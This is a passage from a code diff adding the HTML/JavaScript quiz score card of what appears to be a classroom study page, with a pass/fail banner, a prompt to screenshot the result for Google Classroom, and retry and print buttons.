+        <div class="score-card-big" style="color:${passed?'var(--green)':'#e74c3c'}">${pct}%</div>
+        <div class="score-card-lbl">Score</div>
+      </div>
+      <div class="score-card-num">
+        <div class="score-card-big" style="color:var(--blue)">${score}/${total}</div>
+        <div class="score-card-lbl">Correct</div>
+      </div>
+    </div>
+    <div class="score-card-banner ${passed?'pass':'fail'}">
+      ${passed ? '✓ Above passing threshold (72%)' : '✗ Below passing threshold — retake on Day 5'}
+    </div>
+    <div style="text-align:center;font-size:1.1rem;font-weight:700;margin-bottom:16px;">${grade}</div>
+    <div class="screenshot-prompt">
+      <div class="sp-label">📸 SCREENSHOT THIS TO SUBMIT</div>
+      <div class="sp-sub">Take a screenshot and upload to Google Classroom as your Day 4 submission</div>
+    </div>
+    <div class="score-card-btns">
+      <button onclick="initQuiz()" style="background:linear-gradient(135deg,var(--accent),var(--accent2));color:white;">🔄 Try Again</button>
+      <button onclick="window.print()" style="background:var(--surface2);color:var(--text);border:1px solid var(--border);">🖨 Print</button>
+    </div>
+  </div>`;
+}
+
+  loadTracker();
+</script>
+</body>
+</html>
